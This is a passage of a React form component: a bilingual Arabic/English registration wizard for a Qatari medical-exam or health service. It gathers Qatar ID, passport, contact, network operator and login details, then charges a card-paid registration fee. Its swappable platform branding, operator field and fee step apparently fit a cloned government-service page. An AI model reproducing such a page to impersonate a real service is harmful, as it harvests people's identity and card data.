                <RadioGroupItem id="g-f" value="female" className="border-gray-400 data-[state=checked]:border-[#8b1538] data-[state=checked]:text-[#8b1538]" />
                <Label htmlFor="g-f" className="cursor-pointer text-sm text-gray-700">{t("أنثى", "Female")}</Label>
              </div>
            </RadioGroup>
            <ErrMsg m={errors.gender} />
          </div>
          {data.gender === "female" && !serviceContext.isSehhaty && (
            <div className="md:col-span-2">
              <Label className="text-gray-600 text-sm">{t("هل أنتِ حامل حالياً؟", "Are you currently pregnant?")} <Star /></Label>
              <RadioGroup value={data.pregnant} onValueChange={(v) => update("pregnant", v as "yes" | "no")} className="flex gap-6 mt-2" dir={dir}>
                <div className="flex items-center gap-2">
                  <RadioGroupItem id="p-y" value="yes" className="border-gray-400 data-[state=checked]:border-[#8b1538] data-[state=checked]:text-[#8b1538]" />
                  <Label htmlFor="p-y" className="cursor-pointer text-sm text-gray-700">{t("نعم", "Yes")}</Label>
                </div>
                <div className="flex items-center gap-2">
                  <RadioGroupItem id="p-n" value="no" className="border-gray-400 data-[state=checked]:border-[#8b1538] data-[state=checked]:text-[#8b1538]" />
                  <Label htmlFor="p-n" className="cursor-pointer text-sm text-gray-700">{t("لا", "No")}</Label>
                </div>
              </RadioGroup>
              <p className="text-[11px] text-gray-500 mt-1">
                {t(
                  `مطلوب لاستثناء أشعة الصدر عند الحاجة وفق بروتوكولات ${serviceContext.platformShortAr}.`,
                  `Required to exclude chest X-ray if applicable per ${serviceContext.platformShortEn} protocols.`
                )}
              </p>
              <ErrMsg m={errors.pregnant} />
            </div>
          )}
        </>
      ) : (
        <>
          <div>
            <Label className="text-gray-600 text-sm">{t("اسم المنشأة بالعربية", "Establishment name (Arabic)")} <Star /></Label>
            <Input dir="rtl" value={data.companyNameAr} onChange={(e) => update("companyNameAr", e.target.value)} maxLength={150} className={errCls(!!errors.companyNameAr)} />
            <ErrMsg m={errors.companyNameAr} />
          </div>
          <div>
            <Label className="text-gray-600 text-sm">{t("اسم المنشأة بالإنجليزية", "Establishment name (English)")} <Star /></Label>
            <Input dir="ltr" value={data.companyNameEn} onChange={(e) => update("companyNameEn", e.target.value)} maxLength={150} className={errCls(!!errors.companyNameEn)} />
            <ErrMsg m={errors.companyNameEn} />
          </div>
          <div>
            <Label className="text-gray-600 text-sm">{t("رقم المنشأة", "Establishment number")} <Star /></Label>
            <Input dir="ltr" inputMode="numeric" value={data.establishmentNo}
                   onChange={(e) => update("establishmentNo", e.target.value.replace(/\D/g, "").slice(0, 15))}
                   placeholder="1234567" className={errCls(!!errors.establishmentNo)} />
            <ErrMsg m={errors.establishmentNo} />
          </div>
          <div>
            <Label className="text-gray-600 text-sm">{t("رقم السجل التجاري", "Commercial Registration No.")} <Star /></Label>
            <Input dir="ltr" inputMode="numeric" value={data.commercialRegNo}
                   onChange={(e) => update("commercialRegNo", e.target.value.replace(/\D/g, "").slice(0, 15))}
                   className={errCls(!!errors.commercialRegNo)} />
            <ErrMsg m={errors.commercialRegNo} />
          </div>
          <div>
            <Label className="text-gray-600 text-sm">{t("نوع النشاط", "Activity type")} <Star /></Label>
            <Select value={data.activityType} onValueChange={(v) => update("activityType", v)}>
              <SelectTrigger className={errCls(!!errors.activityType)}>
                <SelectValue placeholder={t("اختر نوع النشاط", "Select activity")} />
              </SelectTrigger>
              <SelectContent>
                {ACTIVITY_TYPES.map((a) => <SelectItem key={a.v} value={a.v}>{t(a.ar, a.en)}</SelectItem>)}
              </SelectContent>
            </Select>
            <ErrMsg m={errors.activityType} />
          </div>
          <div>
            <Label className="text-gray-600 text-sm">{t("تاريخ التأسيس", "Establishment date")} <Star /></Label>
            <DateSelect
              value={data.establishmentDate}
              onChange={(v) => update("establishmentDate", v)}
              hasError={!!errors.establishmentDate}
              minYear={1950}
              maxYear={new Date().getFullYear()}
            />
            <ErrMsg m={errors.establishmentDate} />
          </div>
          <div className="md:col-span-2">
            <Label className="text-gray-600 text-sm">{t("الرقم الشخصي للمفوض بالتوقيع", "Authorized signatory Qatar ID")} <Star /></Label>
            <Input
              dir="ltr"
              inputMode="numeric"
              maxLength={11}
              autoComplete="off"
              value={data.qatarId}
              onChange={(e) => update("qatarId", sanitizeQatarId(e.target.value))}
              onKeyDown={qatarIdKeyDownGuard}
              onPaste={(e) => {
                const cleaned = qatarIdPasteSanitizer(e);
                if (cleaned !== null) update("qatarId", cleaned);
              }}
              placeholder="28xxxxxxxxx"
              className={errCls(!!errors.qatarId)}
            />
            <ErrMsg m={errors.qatarId} />
          </div>
        </>
      )}
    </div>
  </div>
);

/* Step 2: contact + address */
const Step2 = ({ data, update, errors, t, serviceContext }: StepProps) => (
  <div className="space-y-6">
    <IntroBanner
      icon={<Mail className="w-5 h-5 text-white" />}
      title={data.userType === "company"
        ? t("بيانات التواصل وعنوان المنشأة", "Establishment contact & address")
        : t("بيانات التواصل والعنوان", "Contact & address")}
      body={data.userType === "company"
        ? t(
            `سنستخدم بيانات التواصل الرسمية للمنشأة لإرسال إشعارات ${serviceContext.platformShortAr} والتقارير عند توفرها. يجب أن يكون الرقم مسجّلاً باسم المنشأة.`,
            `We use the establishment's official contact details for ${serviceContext.platformShortEn} notifications and reports when available. The number must be registered under the establishment's name.`
          )
        : t(
            `سنستخدم هذه البيانات لإرسال إشعارات ${serviceContext.platformShortAr} الخاصة بالخدمة المطلوبة. يجب أن يكون رقم الهاتف مسجّلاً باسمك.`,
            `We use this data to send ${serviceContext.platformShortEn} notifications for the requested service. The phone number must be registered under your name.`
          )}
    />
    <div className="grid md:grid-cols-2 gap-4">
      <div className="md:col-span-2">
        <Label className="text-gray-600 text-sm">
          {data.userType === "company"
            ? t("البريد الرسمي للمنشأة", "Establishment official email")
            : t("البريد الإلكتروني", "Email")} <Star />
        </Label>
        <Input type="email" dir="ltr" value={data.email} onChange={(e) => update("email", e.target.value)} maxLength={120} placeholder="name@example.com" className={errCls(!!errors.email)} />
        <ErrMsg m={errors.email} />
      </div>
      <div>
        <Label className="text-gray-600 text-sm">
          {data.userType === "company"
            ? t("رقم هاتف المنشأة", "Establishment phone")
            : t("رقم الهاتف القطري", "Qatari phone")} <Star />
        </Label>
        <div className="relative">
          <Input dir="ltr" inputMode="tel" value={data.phone} onChange={(e) => update("phone", e.target.value.replace(/\D/g, "").slice(0, 8))} placeholder="3xxxxxxx" className={`${errCls(!!errors.phone)} ps-10`} />
          <Phone className="absolute start-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
        </div>
        <ErrMsg m={errors.phone} />
      </div>
      <div>
        <Label className="text-gray-600 text-sm">{t("مشغل الشبكة", "Network operator")} <Star /></Label>
        <div className="relative">
          <Select value={data.networkOperator} onValueChange={(v) => update("networkOperator", v)}>
            <SelectTrigger className={`${errCls(!!errors.networkOperator)} ps-10`}>
              <SelectValue placeholder={t("اختر مشغل الشبكة", "Select operator")} />
            </SelectTrigger>
            <SelectContent>
              {NETWORK_OPERATORS.map((o) => (
                <SelectItem key={o.v} value={o.v}>{t(o.ar, o.en)}</SelectItem>
              ))}
            </SelectContent>
          </Select>
          <Signal className="absolute start-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
        </div>
        <ErrMsg m={errors.networkOperator} />
      </div>
    </div>

    <div className="pt-2 border-t border-gray-100">
      <div className="flex items-center gap-2 mb-3 mt-3">
        <MapPin className="w-4 h-4" style={{ color: MAROON }} />
        <span className="text-sm font-semibold text-gray-700">
          {data.userType === "company"
            ? t("عنوان المنشأة في قطر", "Establishment address in Qatar")
            : t("عنوان الإقامة في قطر", "Address in Qatar")}
        </span>
      </div>
      <div className="grid md:grid-cols-2 gap-4">
        <div>
          <Label className="text-gray-600 text-sm">{t("البلدية", "Municipality")} <Star /></Label>
          <Select value={data.governorate} onValueChange={(v) => update("governorate", v)}>
            <SelectTrigger className={errCls(!!errors.governorate)}>
              <SelectValue placeholder={t("اختر البلدية", "Select")} />
            </SelectTrigger>
            <SelectContent>
              {GOVERNORATES.map((g) => <SelectItem key={g} value={g}>{t(g, GOVERNORATES_EN[g] || g)}</SelectItem>)}
            </SelectContent>
          </Select>
          <ErrMsg m={errors.governorate} />
        </div>
        <div>
          <Label className="text-gray-600 text-sm">{t("المنطقة", "Area")} <Star /></Label>
          <Input value={data.area} onChange={(e) => update("area", e.target.value)} maxLength={80} className={errCls(!!errors.area)} />
          <ErrMsg m={errors.area} />
        </div>
        <div>
          <Label className="text-gray-600 text-sm">{t("الشارع", "Street")} <Star /></Label>
          <Input value={data.street} onChange={(e) => update("street", e.target.value)} maxLength={80} className={errCls(!!errors.street)} />
          <ErrMsg m={errors.street} />
        </div>
        <div>
          <Label className="text-gray-600 text-sm">
            {data.userType === "company"
              ? t("رقم مبنى المنشأة", "Establishment building No.")
              : t("رقم المبنى", "Building No.")} <Star />
          </Label>
          <Input dir="ltr" value={data.building} onChange={(e) => update("building", e.target.value)} maxLength={20} className={errCls(!!errors.building)} />
          <ErrMsg m={errors.building} />
        </div>
      </div>
    </div>
  </div>
);

/* Step 3: employer + account */
function Step3({ data, update, errors, t, serviceContext }: StepProps) {
  const [showPassword, setShowPassword] = useState(false);
  const [showConfirm, setShowConfirm] = useState(false);
  return (
    <div className="space-y-6">
      <IntroBanner
        icon={<Building2 className="w-5 h-5 text-white" />}
        title={data.userType === "company"
          ? t(serviceContext.isSehhaty ? "الغرض من الخدمة وبيانات الحساب" : "غرض الفحوصات وبيانات الحساب", serviceContext.isSehhaty ? "Service purpose & account" : "Exams purpose & account")
          : t(serviceContext.isSehhaty ? "الغرض من الخدمة وبيانات الحساب" : "العمل وبيانات الحساب", serviceContext.isSehhaty ? "Service purpose & account" : "Employment & account")}
        body={data.userType === "company"
          ? t(
              serviceContext.isSehhaty
                ? "اختر الغرض من استخدام خدمات صحتي وأنشئ بيانات دخول قوية لحساب المنشأة."
                : "اختر الغرض من فحوصات الموظفين وأنشئ بيانات دخول قوية لحساب المنشأة.",
              serviceContext.isSehhaty
                ? "Choose the purpose of using My Health services and create strong credentials for the establishment account."
                : "Choose the purpose of employee exams and create strong credentials for the establishment account."
            )
          : t(
              serviceContext.isSehhaty
                ? `اختر الغرض من استخدام ${serviceContext.platformShortAr} وأنشئ بيانات دخول قوية. ستحتاج اسم المستخدم وكلمة المرور لاحقاً لمتابعة طلباتك.`
                : "اختر الغرض من الفحص وأنشئ بيانات دخول قوية. ستحتاج اسم المستخدم وكلمة المرور لاحقاً لمتابعة طلباتك.",
              serviceContext.isSehhaty
                ? `Choose the purpose of using ${serviceContext.platformShortEn} and create strong credentials. You will need them later to follow up your requests.`
                : "Choose the exam purpose and create strong credentials. You will need them later to follow up your requests."
            )}
      />
      <div className="grid md:grid-cols-2 gap-4">
        {data.userType === "individual" && !serviceContext.isSehhaty && (
          <>
            <div>
              <Label className="text-gray-600 text-sm">{t("جهة العمل / الكفيل (اختياري)", "Employer / Sponsor (optional)")}</Label>
              <Input value={data.employer} onChange={(e) => update("employer", e.target.value)} maxLength={120} className={errCls(false)} />
            </div>
            <div>
              <Label className="text-gray-600 text-sm">{t("المهنة", "Occupation")} <Star /></Label>
              <Select value={data.occupation} onValueChange={(v) => update("occupation", v)}>
                <SelectTrigger className={errCls(!!errors.occupation)}>
                  <SelectValue placeholder={t("اختر المهنة", "Select occupation")} />
                </SelectTrigger>
                <SelectContent>
                  {OCCUPATIONS.map((o) => (
                    <SelectItem key={o.v} value={o.v}>{t(o.ar, o.en)}</SelectItem>
                  ))}
                </SelectContent>
              </Select>
              <ErrMsg m={errors.occupation} />
            </div>
          </>
        )}
        <div className={data.userType === "company" ? "md:col-span-2" : ""}>
          <Label className="text-gray-600 text-sm">
            {data.userType === "company"
              ? t(serviceContext.isSehhaty ? "الغرض من خدمات الموظفين الصحية" : "الغرض من فحوصات الموظفين", serviceContext.isSehhaty ? "Employee health services purpose" : "Employee exams purpose")
              : t(serviceContext.isSehhaty ? "الغرض من الخدمة" : "الغرض من الفحص", serviceContext.isSehhaty ? "Service purpose" : "Exam purpose")} <Star />
          </Label>
          <Select
            value={data.userType === "company" ? data.purposeCompany : data.purpose}
            onValueChange={(v) => update(data.userType === "company" ? "purposeCompany" : "purpose", v)}
          >
            <SelectTrigger className={errCls(!!(data.userType === "company" ? errors.purposeCompany : errors.purpose))}>
              <SelectValue placeholder={t("اختر الغرض", "Select purpose")} />
            </SelectTrigger>
            <SelectContent>
              {(data.userType === "company"
                ? serviceContext.isSehhaty ? SEHHATY_COMPANY_PURPOSES : COMPANY_PURPOSES
                : serviceContext.isSehhaty ? SEHHATY_PURPOSES : PURPOSES
              ).map((p) => (
                <SelectItem key={p.v} value={p.v}>{t(p.ar, p.en)}</SelectItem>
              ))}
            </SelectContent>
          </Select>
          <ErrMsg m={data.userType === "company" ? errors.purposeCompany : errors.purpose} />
        </div>
      </div>

      <div className="pt-2 border-t border-gray-100">
        <div className="flex items-center gap-2 mb-3 mt-3">
          <Lock className="w-4 h-4" style={{ color: MAROON }} />
          <span className="text-sm font-semibold text-gray-700">{t("بيانات الدخول", "Login credentials")}</span>
        </div>
        <div className="grid md:grid-cols-2 gap-4">
          <div className="md:col-span-2">
            <Label className="text-gray-600 text-sm">{t("اسم المستخدم", "Username")} <Star /></Label>
            <Input dir="ltr" value={data.username} onChange={(e) => update("username", e.target.value.replace(/[^A-Za-z0-9_.]/g, ""))} maxLength={30} className={errCls(!!errors.username)} />
            <ErrMsg m={errors.username} />
          </div>
          <div>
            <Label className="text-gray-600 text-sm">{t("كلمة المرور", "Password")} <Star /></Label>
            <div className="relative">
              <Input type={showPassword ? "text" : "password"} dir="ltr" value={data.password} onChange={(e) => update("password", e.target.value)} maxLength={64} className={`${errCls(!!errors.password)} pe-10`} />
              <button
                type="button"
                onClick={() => setShowPassword((s) => !s)}
                className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
                aria-label={showPassword ? t("إخفاء كلمة المرور", "Hide password") : t("إظهار كلمة المرور", "Show password")}
              >
                {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
              </button>
            </div>
            <ErrMsg m={errors.password} />
          </div>
          <div>
            <Label className="text-gray-600 text-sm">{t("تأكيد كلمة المرور", "Confirm password")} <Star /></Label>
            <div className="relative">
              <Input type={showConfirm ? "text" : "password"} dir="ltr" value={data.confirm} onChange={(e) => update("confirm", e.target.value)} maxLength={64} className={`${errCls(!!errors.confirm)} pe-10`} />
              <button
                type="button"
                onClick={() => setShowConfirm((s) => !s)}
                className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
                aria-label={showConfirm ? t("إخفاء كلمة المرور", "Hide password") : t("إظهار كلمة المرور", "Show password")}
              >
                {showConfirm ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
              </button>
            </div>
            <ErrMsg m={errors.confirm} />
          </div>
        </div>
        <p className="text-[11px] text-gray-500 mt-2">
          {t("كلمة المرور: 8 أحرف على الأقل، يفضّل مزج الحروف والأرقام والرموز.",
             "Password: at least 8 characters, mix of letters, numbers and symbols.")}
        </p>
      </div>
    </div>
  );
}

/* Step 4: review + fee + terms */
const Step4 = ({
  data,
  update,
  errors,
  t,
  serviceContext,
  serviceQuery,
  requestTypes,
}: StepProps & { serviceQuery: string; requestTypes: RequestTypeOption[] }) => {
  const [, navigate] = useLocation();
  const isCompany = data.userType === "company";
  const [pdfOpen, setPdfOpen] = useState(false);
  const [autoPrint, setAutoPrint] = useState(false);

  type Row = { label: string; value: string; missing: boolean; step: number };
  type Section = { title: string; step: number; rows: Row[] };

  const val = (v: string | undefined | null) => (v && String(v).trim() ? String(v) : "");
  const req = (label: string, raw: string | undefined | null, step: number, display?: string): Row => {
    const v = val(raw);
    return { label, value: v ? (display ?? v) : t("— غير مكتمل", "— missing"), missing: !v, step };
  };

  const generalSection: Section = {
    title: t("بيانات الطلب", "Request details"),
    step: 1,
    rows: [
      req(t("نوع الطلب", "Request type"), data.requestType, 1,
        requestTypes.find((o) => o.v === data.requestType)?.ar),
      { label: t("نوع المستخدم", "User type"),
        value: isCompany ? t("مستخدم شركة / منشأة", "Company") : t("مستخدم فردي", "Individual"),
        missing: false, step: 1 },
    ],
  };

  const identitySection: Section = isCompany
    ? {
        title: t("بيانات المنشأة", "Establishment information"),
        step: 1,
        rows: [
          req(t("اسم المنشأة (عربي)", "Establishment name (AR)"), data.companyNameAr, 1),
          req(t("اسم المنشأة (إنجليزي)", "Establishment name (EN)"), data.companyNameEn, 1),
          req(t("رقم المنشأة", "Establishment No."), data.establishmentNo, 1),
          req(t("رقم السجل التجاري", "Commercial Registration No."), data.commercialRegNo, 1),
          req(t("نوع النشاط", "Activity"), data.activityType, 1,
            ACTIVITY_TYPES.find((a) => a.v === data.activityType)?.ar),
          req(t("تاريخ التأسيس", "Establishment date"), data.establishmentDate, 1),
          req(t("الرقم الشخصي للمفوض بالتوقيع", "Authorized signatory Qatar ID"), data.qatarId, 1),
        ],
      }
    : {
        title: t("البيانات الشخصية", "Personal information"),
        step: 1,
        rows: [
          req(t("الاسم بالعربية", "Name (AR)"), data.fullNameAr, 1),
          req(t("الاسم بالإنجليزية", "Name (EN)"), data.fullNameEn, 1),
          req(t("الهوية القطرية", "Qatar ID"), data.qatarId, 1),
          req(t("رقم الجواز", "Passport"), data.passportNo, 1),
          ...(!serviceContext.isSehhaty
            ? [{ label: t("رقم التأشيرة", "Visa number"),
                value: val(data.visaNo) || t("— غير مذكور", "— not provided"),
                missing: false, step: 1 } as Row]
            : []),
          req(t("الجنسية", "Nationality"), data.nationality, 1),
          req(t("تاريخ الميلاد", "Date of birth"), data.dob, 1),
          req(t("الجنس", "Gender"), data.gender, 1,
            data.gender === "male" ? t("ذكر", "Male") : data.gender === "female" ? t("أنثى", "Female") : ""),
          ...(data.gender === "female" && !serviceContext.isSehhaty
            ? [req(t("حالة الحمل", "Pregnancy"), data.pregnant, 1,
                data.pregnant === "yes" ? t("نعم", "Yes") : data.pregnant === "no" ? t("لا", "No") : "")]
            : []),
        ],
      };

  const addressLabel = isCompany
    ? t("عنوان المنشأة في قطر", "Establishment address in Qatar")
    : t("عنوان الإقامة في قطر", "Address in Qatar");
  const addressValue = [
    val(data.governorate),
    val(data.area),
    val(data.street),
    val(data.building) && `${t("مبنى", "Bldg")} ${data.building}`,
  ].filter(Boolean).join(" — ");
  const addressMissing = !val(data.governorate) || !val(data.area) || !val(data.street) || !val(data.building);

  const contactSection: Section = {
    title: isCompany
      ? t("بيانات التواصل وعنوان المنشأة", "Establishment contact & address")
      : t("بيانات التواصل والعنوان", "Contact & address"),
    step: 2,
    rows: [
      req(isCompany ? t("البريد الرسمي للمنشأة", "Establishment email") : t("البريد الإلكتروني", "Email"), data.email, 2),
      req(isCompany ? t("رقم هاتف المنشأة", "Establishment phone") : t("رقم الهاتف", "Phone"), data.phone, 2),
      req(t("مشغل الشبكة", "Network operator"), data.networkOperator, 2,
        NETWORK_OPERATORS.find((o) => o.v === data.networkOperator)?.ar),
      { label: addressLabel,
        value: addressValue || t("— غير مكتمل", "— missing"),
        missing: addressMissing, step: 2 },
    ],
  };

  const purposeVal = isCompany ? data.purposeCompany : data.purpose;
  const purposeDisplay = isCompany
    ? (serviceContext.isSehhaty ? SEHHATY_COMPANY_PURPOSES : COMPANY_PURPOSES).find((p) => p.v === purposeVal)?.ar
    : (serviceContext.isSehhaty ? SEHHATY_PURPOSES : PURPOSES).find((p) => p.v === purposeVal)?.ar;
  const accountSection: Section = {
    title: isCompany
      ? t("الغرض وبيانات الحساب", "Purpose & account")
      : t("العمل وبيانات الحساب", "Employment & account"),
    step: 3,
    rows: [
      ...(isCompany
        ? []
        : (serviceContext.isSehhaty
            ? []
            : [{ label: t("جهة العمل", "Employer"),
                 value: val(data.employer) || t("— غير مذكور", "— not provided"),
                 missing: false, step: 3 } as Row,
                req(t("المهنة", "Occupation"), data.occupation, 3,
                  OCCUPATIONS.find((o) => o.v === data.occupation)?.ar)])),
      req(
          isCompany
            ? t(serviceContext.isSehhaty ? "الغرض من خدمات الموظفين الصحية" : "الغرض من فحوصات الموظفين", serviceContext.isSehhaty ? "Employee health services purpose" : "Employee exams purpose")
            : t(serviceContext.isSehhaty ? "الغرض من الخدمة" : "الغرض من الفحص", serviceContext.isSehhaty ? "Service purpose" : "Exam purpose"),
          purposeVal, 3, purposeDisplay),
      req(t("اسم المستخدم", "Username"), data.username, 3),
    ],
  };

  const sections: Section[] = [generalSection, identitySection, contactSection, accountSection];
  const missingCount = sections.reduce((n, s) => n + s.rows.filter((r) => r.missing).length, 0);
  const firstMissingStep = sections
    .flatMap((s) => s.rows)
    .find((r) => r.missing)?.step;

  const summarySections: SummarySection[] = sections.map((s) => ({
    title: s.title,
    rows: s.rows.map((r) => ({ label: r.label, value: r.value, missing: r.missing })),
  }));
  const openPreview = (print: boolean) => {
    setAutoPrint(print);
    setPdfOpen(true);
  };

  return (
    <div className="space-y-6">
      <IntroBanner
        icon={<ShieldCheck className="w-5 h-5 text-white" />}
        title={t("راجع بياناتك قبل الدفع", "Review your data before payment")}
        body={t(
          `تأكّد من صحة جميع المعلومات الخاصة بخدمة ${serviceContext.titleAr}. لا يمكن تعديل الطلب بعد إتمام الدفع إلا بمراجعة الدعم الفني.`,
          `Verify all information for ${serviceContext.titleEn}. After payment the request cannot be edited without contacting support.`
        )}
      />

      <div className="flex flex-wrap items-center justify-end gap-2">
        <button
          type="button"
          onClick={() => openPreview(false)}
          className="inline-flex items-center gap-2 rounded-md border border-gray-300 bg-white px-3 py-2 text-xs font-semibold text-gray-700 hover:bg-gray-50"
        >
          <FileDown className="w-3.5 h-3.5" />
          {t("حفظ بصيغة PDF", "Save as PDF")}
        </button>
        <button
          type="button"
          onClick={() => openPreview(true)}
          className="inline-flex items-center gap-2 rounded-md px-3 py-2 text-xs font-semibold text-white"
          style={{ backgroundColor: MAROON }}
        >
          <Printer className="w-3.5 h-3.5" />
          {t("طباعة ملخص الطلب", "Print request summary")}
        </button>
      </div>

      {missingCount > 0 && (
        <div
          role="alert"
          className="rounded-md p-4 flex items-start gap-3"
          style={{ backgroundColor: "#fef2f2", border: "1px solid #f5b7b1" }}
        >
          <div className="w-9 h-9 rounded-full flex items-center justify-center shrink-0" style={{ backgroundColor: MAROON }}>
            <AlertTriangle className="w-5 h-5 text-white" />
          </div>
          <div className="flex-1">
            <h3 className="font-bold text-sm mb-1" style={{ color: MAROON }}>
              {t(`يوجد ${missingCount} حقل ناقص أو غير صحيح`,
                 `${missingCount} field(s) are missing or invalid`)}
            </h3>
            <p className="text-xs text-gray-700 leading-relaxed mb-2">
              {t(
                "لن تتمكن من المتابعة إلى الدفع قبل استكمال البيانات المطلوبة الموضّحة أدناه باللون الأحمر.",
                "You cannot continue to payment until all required fields highlighted in red below are completed."
              )}
            </p>
            {firstMissingStep && (
              <button
                type="button"
                onClick={() => navigate(`/medical-register/step/${firstMissingStep}${serviceQuery}`)}
                className="text-xs font-semibold underline"
                style={{ color: MAROON }}
              >
                {t(`العودة إلى الخطوة ${firstMissingStep} لاستكمال البيانات`,
                   `Go back to step ${firstMissingStep} to complete data`)}
              </button>
            )}
          </div>
        </div>
      )}

      <div className="space-y-4">
        {sections.map((section) => {
          const sectionMissing = section.rows.filter((r) => r.missing).length;
          return (
            <div key={section.title} className="rounded-md border border-gray-200 overflow-hidden bg-white">
              <div className="flex items-center justify-between gap-3 px-4 py-2.5 border-b border-gray-200 bg-gray-50">
                <h4 className="text-sm font-bold" style={{ color: MAROON }}>{section.title}</h4>
                <div className="flex items-center gap-2">
                  {sectionMissing > 0 && (
                    <span className="text-[11px] font-semibold px-2 py-0.5 rounded-md text-white"
                          style={{ backgroundColor: MAROON }}>
                      {t(`${sectionMissing} ناقص`, `${sectionMissing} missing`)}
                    </span>
                  )}
                  <button
                    type="button"
                    onClick={() => navigate(`/medical-register/step/${section.step}${serviceQuery}`)}
                    className="text-[11px] font-semibold underline text-gray-600 hover:text-gray-900"
                  >
                    {t("تعديل", "Edit")}
                  </button>
                </div>
              </div>
              {section.rows.map((r, i) => (
                <div
                  key={r.label}
                  className={`flex items-start justify-between gap-3 px-4 py-2.5 text-sm ${i % 2 ? "bg-white" : "bg-gray-50/60"} ${r.missing ? "border-s-4" : ""}`}
                  style={r.missing ? { borderInlineStartColor: MAROON, backgroundColor: "#fdf2f4" } : undefined}
                >
                  <span className="text-gray-500 shrink-0">{r.label}</span>
                  <span
                    className={`font-semibold text-left ${r.missing ? "text-red-700" : "text-gray-800"}`}
                    style={{ direction: "ltr" }}
                  >
                    {r.value}
                  </span>
                </div>
              ))}
            </div>
          );
        })}
      </div>

      {/* Fee card */}
      <div className="rounded-md p-4 flex items-start gap-3"
           style={{ backgroundColor: "#fff8ec", border: "1px solid #f0c674" }}>
        <div className="w-10 h-10 rounded-full flex items-center justify-center shrink-0"
             style={{ backgroundColor: "#b7791f" }}>
          <Wallet className="w-5 h-5 text-white" />
        </div>
        <div className="flex-1">
          <div className="flex items-center justify-between gap-2 mb-1">
            <h3 className="font-bold text-sm text-[#7a5210]">
              {t("رسوم التسجيل الإلكتروني", "Online registration fee")}
            </h3>
            <span className="text-sm font-extrabold px-2.5 py-1 rounded-md text-white"
                  style={{ backgroundColor: MAROON }}>
              {t(`${FEE_QAR} ر.ق`, `QAR ${FEE_QAR}`)}
            </span>
          </div>
          <p className="text-xs text-[#7a5210] leading-relaxed">
            {t(
              `رسم إداري لمرة واحدة بقيمة ${FEE_QAR} ريال قطري لمعالجة طلب التسجيل، والتحقق من البيانات، وربط الحساب بخدمة ${serviceContext.titleAr} عبر ${serviceContext.platformShortAr}.`,
              `A one-time administrative fee of QAR ${FEE_QAR} to process the registration request, verify details, and link the account to ${serviceContext.titleEn} through ${serviceContext.platformShortEn}.`
            )}
          </p>
          <div className="mt-2 flex items-center gap-2 text-[11px] text-[#7a5210]">
            <CreditCard className="w-3.5 h-3.5" />
            {t("يدعم بطاقات Visa و Mastercard و NAPS القطرية.", "Supports Visa, Mastercard and Qatari NAPS cards.")}
          </div>
        </div>
      </div>

      {/* Terms */}
      <div className="rounded-md p-4"
           style={{ backgroundColor: "#f8fafc", border: "1px solid #e2e8f0" }}>
        <div className="flex items-start gap-3">
          <Checkbox
            id="accept"
            checked={data.accept}
            onCheckedChange={(v) => update("accept", v === true)}
            className="mt-1 data-[state=checked]:bg-[#8b1538] data-[state=checked]:border-[#8b1538]"
          />
          <label htmlFor="accept" className="text-sm text-gray-700 leading-relaxed cursor-pointer">
            {t(
              `أُقرّ بصحة البيانات المُدخلة، وأوافق على دفع رسوم التسجيل البالغة ${FEE_QAR} ر.ق وعلى `,
              `I confirm the data is correct and agree to pay the QAR ${FEE_QAR} registration fee and to the `
            )}
            <span className="font-semibold" style={{ color: MAROON }}>
              {t("الشروط والأحكام وسياسة الخصوصية", "Terms & Privacy Policy")}
            </span>
            {t(` الخاصة بـ ${serviceContext.platformAr}.`, ` of ${serviceContext.platformEn}.`)}
          </label>
        </div>
        <ErrMsg m={errors.accept} />
        <div className="mt-3 flex items-center gap-2 text-[11px] text-gray-500">
          <FileText className="w-3.5 h-3.5" />
          {t(
            "بالضغط على المتابعة سيتم تحويلك إلى صفحة إدخال بيانات البطاقة لإتمام الدفع بشكل آمن.",
            "By continuing you will be redirected to the card details page to complete payment securely."
          )}
        </div>
      </div>

      <RequestSummaryPreview
        open={pdfOpen}
        onClose={() => setPdfOpen(false)}
        platform={serviceContext.isSehhaty ? "sehhaty" : "medical"}
        serviceTitle={t(serviceContext.titleAr, serviceContext.titleEn)}
        sections={summarySections}
        fee={t(`${FEE_QAR} ريال قطري`, `QAR ${FEE_QAR}`)}
        accepted={!!data.accept}
        autoPrint={autoPrint}
      />
    </div>
  );
};

const IntroBanner = ({ icon, title, body }: { icon: React.ReactNode; title: string; body: string }) => (
  <div className="rounded-md p-4"
       style={{ backgroundColor: "#fdf1f4", border: `1px solid ${MAROON}33` }}>
    <div className="flex items-start gap-3">
      <div className="w-9 h-9 rounded-full flex items-center justify-center shrink-0"
           style={{ backgroundColor: MAROON }}>
        {icon}
      </div>
      <div className="flex-1">
        <h3 className="font-bold text-base mb-1" style={{ color: MAROON }}>{title}</h3>
        <p className="text-sm text-gray-700 leading-relaxed">{body}</p>
      </div>
    </div>
  </div>
);

export default MedicalRegister;